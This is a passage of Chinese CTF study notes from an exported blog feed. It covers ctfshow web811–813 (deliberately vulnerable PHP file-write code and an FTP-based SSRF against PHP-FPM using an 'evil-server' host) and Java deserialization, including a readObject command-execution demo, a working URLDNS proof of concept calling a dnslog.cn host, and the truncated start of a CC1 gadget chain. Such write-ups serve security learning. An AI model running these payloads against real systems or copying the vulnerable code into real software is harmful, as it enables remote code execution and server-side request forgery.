class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$content</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/leixiao-/p/10226633.html#autoid-0-0-0">PHP-FPM的解释</a></p><p>这里读取路径file，之后写回文件中。这看似什么都没有做。</p><p>这份代码可以用来攻击PHP-FPM</p><p>如果一个客户端试图从FTP服务器上读取文件，服务器会通知客户端将文件的内容读取（或写）到一个特定的IP和端口上。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口。</p><p>现在如果我们使用viewFile=ftp://evil-server/file.txt那么会发生：</p><p>首先通过 file_get_contents() 函数连接到我们的FTP服务器，并下载file.txt。<br>然后再通过 file_put_contents() 函数连接到我们的FTP服务器，并将其上传回file.txt。</p><p>那此时，在它尝试使用file_put_contents()上传回去时，我们告诉它把文件发送到127.0.0.1:9001(fpm的端口，默认是9000)<br>那么，我们就在这中间造成了一次SSRF，攻击php-fpm</p><p><a href="https://blog.csdn.net/miuzzx/article/details/124038567?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167809500916800226543840%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167809500916800226543840&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124038567-null-null.142^v73^control_1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=ctfshow%20web811&amp;spm=1018.2226.3001.4187">羽师傅写的文章wp</a></p><p>跟着这篇文章搞 不知道为啥 还是没复现成功。。。。</p><h2 id="web812-PHP-FPM未授权"><a href="#web812-PHP-FPM未授权" class="headerlink" title="web812(PHP-FPM未授权)"></a>web812(<strong>PHP-FPM未授权</strong>)</h2><p>题目</p><p><img src="../images/image-20230308205937864.png" alt="image-20230308205937864"></p><p>这里的话 <a href="https://blog.csdn.net/miuzzx/article/details/124038567">wp</a></p><h2 id="web813-劫持mysqli"><a href="#web813-劫持mysqli" class="headerlink" title="web813(劫持mysqli)"></a>web813(<strong>劫持mysqli</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;phpinfo&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;run&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;php -r &#x27;ctfshow();&#x27;&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow 常用姿势 刷题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-java 反序列化</title>
      <link href="/posts/50ac4231.html"/>
      <url>/posts/50ac4231.html</url>
      
        <content type="html"><![CDATA[<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>java里的<code>implements</code>和c++里的那个继承是一个意思，就是会继承前者里的属性和函数。 这篇文章有详细讲  —-&gt;  <a href="https://juejin.cn/s/%E5%9C%A8java%E4%B8%ADimplements%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D">文章</a></p><p>这篇文章是讲java序列化与反序列化的  挺详细的  <a href="https://blog.csdn.net/mocas_wang/article/details/107621010?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167724569216800225587158%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=167724569216800225587158&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-107621010-null-null.142^v73^control_1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A8%E8%AE%B2%E8%A7%A3&amp;spm=1018.2226.3001.4187">java序列化与反序列化</a></p><p>可以来看一下这个视频来学习java反序列和序列化 <a href="https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&amp;vd_source=23c2bbe4623ae526416ea7a1ec4679fc">视频</a></p><p>上面的那篇文章是和下面的视频配套着讲的，也有对下面的代码的介绍</p><p>以下是视频中出现的三个java代码</p><p><strong>Person.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//构造函数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,<span class="type">int</span> age)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//对Serializable这个接口里的toString函数进行重写</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;,age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//重新对readObject函数进行重写，然后在里面加一条命令执行的语句，这样的话就会在反序列化的时候就会执行，这样的话就会造成安全问题</span></span><br><span class="line">        ois.defaultReadObject();;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>); <span class="comment">//Runtime.getRuntime().exec 用于调用外部可执行程序或系统命令</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>SerializationTest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>UnserializationTest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span>ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person)unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="comment">//序列化的话会把对象变成字节序列(字符串或者二进制文件)</span></span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的话为什么java反序列化会产生安全问题？</p><p>只要服务端会反序列化数据的话，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。</p><p><strong>可能的形式</strong></p><p>1.<strong>入口类</strong>的readObject直接调用危险方法</p><p>(1   这里的话就是对person类里的readObject函数进行重写，然后在里面加上一条命令执行的语句)</p><p>2.入口类参数中包含可控类，该类有危险方法，readObject时调用。</p><p>3.入口类参数中包含可控类，该类又调用其他又危险方法的类，readObject时调用</p><p>比如类型定义为Object,调用equals/hashcode/toString</p><p>重点 相同类型 同名函数</p><p>(2   3都是类似套娃一样的，一层套一层的类)</p><p>4.构造函数/静态代码块等类加载时隐式执行</p><p>1.共同条件 继承Serializable</p><p>2.入口类条件 source(重写readObject 参数类型广泛 最好jdk自带) —-&gt;  Map HashMap  HashTable   <a href="https://zhuanlan.zhihu.com/p/84533476">HashMap为什么要重写readObject</a></p><p>3.调用链 gadget chain  <strong>相同名称 相同类型</strong></p><p>4.执行类 sink (rce ssrf 写文件等等)</p><p>这里的话我是根据这两篇文章来看着跟进的 <a href="https://blog.csdn.net/qq_47886905/article/details/123531299">文章1</a> <a href="https://blog.csdn.net/cosmoslin/article/details/122838465">文章2</a> <a href="https://www.anquanke.com/post/id/201762">文章三</a></p><p><strong>这两篇文章中写的put函数方法，put函数里的东西就有putVal函数，然后这时候就会进行dns请求，然后hashcode值就会被改变，导致最后readObject里的hash(key)不会进行dns请求</strong></p><p>这两篇文章里是利用java的<strong>反射</strong>来修改 hashcode值</p><p><a href="https://cloud.tencent.com/developer/article/1614318">反射的文章</a></p><p><strong>反射</strong></p><p>反射的作用：让java具有动态性</p><p>修改已有对象的属性</p><p>动态生成对象</p><p>动态调用方法</p><p>操作内部类和私有方法</p><p>在反序列化漏洞中的应用：</p><p>定制需要的对象</p><p>通过invoke调用除了同名函数以外的函数</p><p>通过Class类创建对象，引入不能序列化的类</p><p><strong>反射学习写的代码</strong>  视频  <a href="https://www.bilibili.com/video/BV16h411z7o9?p=2&amp;vd_source=bacfffe46b930fda5761b63367eb298c">反射</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> person.getClass();</span><br><span class="line">        <span class="comment">//反射就是操作Class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class里面实例化对象</span></span><br><span class="line">        <span class="comment">//c.newInstance(); --&gt; 这个实例化对象是不能传参的</span></span><br><span class="line">        c.getConstructor();</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">personconstructor</span> <span class="operator">=</span> c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) personconstructor.newInstance(<span class="string">&quot;abc&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        <span class="comment">//System.out.println(p);</span></span><br><span class="line">        <span class="comment">//获取类里面属性</span></span><br><span class="line">        <span class="comment">//Field[] personfiled = c.getFields(); //这个函数的话只可以获取公有属性，私有的不行</span></span><br><span class="line"><span class="comment">//        Field[] personfiled = c.getDeclaredFields();  //私有和公有都能获取</span></span><br><span class="line"><span class="comment">//        for(Field f:personfiled)</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//          System.out.println(f);</span></span><br><span class="line"><span class="comment">//        &#125; 这些都是数组</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>); <span class="comment">//getField  和  getDeclaredFields都不能修改里边的值，因为是私有属性</span></span><br><span class="line">        namefield.setAccessible(<span class="literal">true</span>);  <span class="comment">//这是允许修改私有属性的值</span></span><br><span class="line">        namefield.set(p,<span class="number">23</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//调用类里面的方法</span></span><br><span class="line"><span class="comment">//        Method[] personmethod = c.getMethods();</span></span><br><span class="line"><span class="comment">//        for(Method m:personmethod)</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(m);</span></span><br><span class="line"><span class="comment">//        &#125; 查看这个类里</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">actionmethod</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;action&quot;</span>, String.class);<span class="comment">//如果把person类里边的action函数换成private,那就etDeclaredMethod,然后通过setAccessible(true);修改权限</span></span><br><span class="line">            actionmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            actionmethod.invoke(p,<span class="string">&quot;ggaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>学习中用到的代码</strong>(URLDNS的poc)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//0x01.生成payload</span></span><br><span class="line">        <span class="comment">//设置一个hashMap</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, String&gt;();</span><br><span class="line">        <span class="comment">//设置我们可以接受DNS查询的地址</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://3rzcpr.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="comment">//将URL的hashCode字段设置为允许修改</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）**</span></span><br><span class="line">        <span class="comment">//1. 设置url的hashCode字段为0xdeadbeef（随意的值）</span></span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>);</span><br><span class="line">        <span class="comment">//2. 将url放入hashMap中，右边参数随便写</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;rmb122&quot;</span>);</span><br><span class="line">        <span class="comment">//修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//0x02.写入文件模拟网络传输</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        <span class="comment">//0x03.读取文件，进行反序列化触发payload</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要jdk8 来进行运行</p><p><a href="https://github.com/bit4woo/code2sec.com/blob/master/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%BA%8C%EF%BC%9AJava%E7%9A%84%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%EF%BC%88Java%20Reflection%EF%BC%89.md">github上反射的详细文章</a></p><p><strong>这里的知识点对应着web846</strong>   payload可以去看羽师傅写的博客</p><h2 id="cc链"><a href="#cc链" class="headerlink" title="cc链"></a>cc链</h2><p>jdk动态代理</p><p><a href="https://zhuanlan.zhihu.com/p/567962124">文章</a>   这里就不多写了，  因为这篇文章已经写的很清楚了    </p><p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=3&amp;vd_source=bacfffe46b930fda5761b63367eb298c">视频</a>  这里的话是讲的很明白了  这里有很多都是套路写法</p><h3 id="cc1"><a href="#cc1" class="headerlink" title="cc1"></a>cc1</h3><p>视频讲解   <a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&amp;vd_source=bacfffe46b930fda5761b63367eb298c">cc1</a></p><p><strong>cc.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="comment">//import jdk.internal.org.objectweb.asm.commons.Method;</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> sun.instrument.TransformerManager;</span><br><span class="line"><span class="keyword">import</span> sun.invoke.anon.AnonymousClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.Object.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span 